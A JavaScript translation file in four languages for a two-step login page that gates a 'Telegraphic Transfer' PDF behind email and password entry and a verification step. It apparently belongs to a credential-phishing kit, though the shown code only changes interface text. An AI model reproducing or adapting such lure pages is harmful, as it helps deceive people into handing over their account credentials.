const translations = {
    en: {
        pageTitle: 'Login',
        page2Title: 'Verify Login',
        emailLabel: 'Email Address',
        passwordLabel: 'Password',
        rememberLabel: 'Remember me',
        continueBtn: 'Continue',
        submitBtn: 'Continue to PDF',
        verifyBtn: 'Access PDF',
        viewPdfText: 'View Telegraphic Transfer',
        viewPdfLink: 'View PDF',
        emailError: 'Please enter a valid email address',
        passwordError: 'Password must be at least 6 characters',
        credentialsError: 'Email or password does not match',
        successText: 'Login successful! Redirecting...',
        verifySuccessText: 'Verification successful! Opening PDF...',
        changeEmail: 'Change'
    },
    es: {
        pageTitle: 'Iniciar Sesión',
        page2Title: 'Verificar Inicio de Sesión',
        emailLabel: 'Correo Electrónico',
        passwordLabel: 'Contraseña',
        rememberLabel: 'Recuérdame',
        continueBtn: 'Continuar',
        submitBtn: 'Continuar a PDF',
        verifyBtn: 'Acceder a PDF',
        viewPdfText: 'Ver Transferencia Telegráfica',
        viewPdfLink: 'Ver PDF',
        emailError: 'Por favor ingresa un correo electrónico válido',
        passwordError: 'La contraseña debe tener al menos 6 caracteres',
        credentialsError: 'El correo electrónico o la contraseña no coinciden',
        successText: '¡Inicio de sesión exitoso! Redirigiendo...',
        verifySuccessText: '¡Verificación exitosa! Abriendo PDF...',
        changeEmail: 'Cambiar'
    },
    fr: {
        pageTitle: 'Connexion',
        page2Title: 'Vérifier la Connexion',
        emailLabel: 'Adresse Email',
        passwordLabel: 'Mot de passe',
        rememberLabel: 'Se souvenir de moi',
        continueBtn: 'Continuer',
        submitBtn: 'Continuer vers le PDF',
        verifyBtn: 'Accéder au PDF',
        viewPdfText: 'Voir le Virement Télégraphique',
        viewPdfLink: 'Voir le PDF',
        emailError: 'Veuillez entrer une adresse email valide',
        passwordError: 'Le mot de passe doit contenir au moins 6 caractères',
        credentialsError: 'L\'email ou le mot de passe ne correspond pas',
        successText: 'Connexion réussie! Redirection...',
        verifySuccessText: 'Vérification réussie! Ouverture du PDF...',
        changeEmail: 'Modifier'
    },
    zh: {
        pageTitle: '登录',
        page2Title: '验证登录',
        emailLabel: '电子邮件地址',
        passwordLabel: '密码',
        rememberLabel: '记住我',
        continueBtn: '继续',
        submitBtn: '继续查看PDF',
        verifyBtn: '访问PDF',
        viewPdfText: '查看电汇单',
        viewPdfLink: '查看PDF',
        emailError: '请输入有效的电子邮件地址',
        passwordError: '密码必须至少为6个字符',
        credentialsError: '电子邮件或密码不匹配',
        successText: '登录成功!正在重定向...',
        verifySuccessText: '验证成功!正在打开PDF...',
        changeEmail: '修改'
    }
};

function setLanguage(lang) {
    localStorage.setItem('preferredLanguage', lang);
    
    const pageTitle = document.getElementById('pageTitle');
    const isPage2 = window.location.pathname.includes('page2');
    
    if (isPage2) {
        pageTitle.textContent = translations[lang].page2Title;
        if (document.getElementById('verifyBtn')) {
            document.getElementById('verifyBtn').textContent = translations[lang].verifyBtn;
        }
        if (document.getElementById('successText')) {
            document.getElementById('successText').textContent = translations[lang].verifySuccessText;
        }
    } else {
        pageTitle.textContent = translations[lang].pageTitle;
        if (document.getElementById('continueBtn')) {
            document.getElementById('continueBtn').textContent = translations[lang].continueBtn;
        }
        if (document.getElementById('submitBtn')) {
            document.getElementById('submitBtn').textContent = translations[lang].submitBtn;
        }
        if (document.getElementById('successText')) {
            document.getElementById('successText').textContent = translations[lang].successText;
        }
    }
    
    if (document.getElementById('emailLabel')) {
        document.getElementById('emailLabel').textContent = translations[lang].emailLabel;
    }
    if (document.getElementById('passwordLabel')) {
        document.getElementById('passwordLabel').textContent = translations[lang].passwordLabel;
    }
    if (document.getElementById('rememberLabel')) {
        document.getElementById('rememberLabel').textContent = translations[lang].rememberLabel;
    }
    if (document.getElementById('emailError')) {
        document.getElementById('emailError').textContent = translations[lang].emailError;
    }
    if (document.getElementById('passwordError')) {
        document.getElementById('passwordError').textContent = translations[lang].passwordError;
    }
    if (document.getElementById('changeEmailLink')) {
        document.getElementById('changeEmailLink').textContent = translations[lang].changeEmail;
    }
    if (document.getElementById('viewPdfText')) {
        document.getElementById('viewPdfText').textContent = translations[lang].viewPdfText;
    }
    if (document.getElementById('viewPdfLink')) {
        document.getElementById('viewPdfLink').textContent = translations[lang].viewPdfLink;
    }
    
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.lang === lang) {
            btn.classList.add('active');
        }
    });
    
    window.currentLanguage = lang;
}

document.addEventListener('DOMContentLoaded', function() {
    const preferredLang = localStorage.getItem('preferredLanguage') || 'en';
    setLanguage(preferredLang);
    
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            setLanguage(this.dataset.lang);
        });
    });
});